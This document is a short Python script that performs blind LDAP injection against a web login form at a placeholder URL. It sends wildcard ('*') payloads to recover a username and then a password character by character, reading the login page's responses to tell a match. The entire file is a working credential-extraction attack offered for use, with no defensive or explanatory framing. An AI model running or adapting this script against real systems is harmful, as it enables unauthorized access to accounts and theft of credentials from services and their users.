import string
import requests

# need to remove the wildcard to eliminate false positives

all_chars = list(string.ascii_letters + string.digits + string.punctuation.replace('*', ""))

url = "http://CHANGEME/login"

params = {"username": "brute","password": "*"}

def bruteforce(parameter):
	print(f"Bruteforcing {parameter}")
	unknown = True # used to break out of our loop
	brute = "" # parameter getting tested
	while unknown:
		for a in all_chars:
			params[parameter] = brute + a + '*' # keep trying different characters with wildcard
			print(params[parameter])
			r = requests.post(url, data=params)
			if "Please login" not in r.text and r.status_code != 500: # the ")" symbol caused 500 errors likely due to LDAP syntax 
			 	brute += a # if we make it past the login page add the good value to brute and then start over
			 	break
		for i in range(1):	# test if we are able to login without the wild card
			params[parameter] = brute
			print(brute)
			r = requests.post(url, data=params)
			if "Please login" in r.text or r.status_code== 500:
			 	break
			else:
				print(f"Username : {brute}")
				unknown = False
	return brute


user = bruteforce("username")
params["username"] = user
pword = bruteforce("password")

print(f"{user} : {pword}")

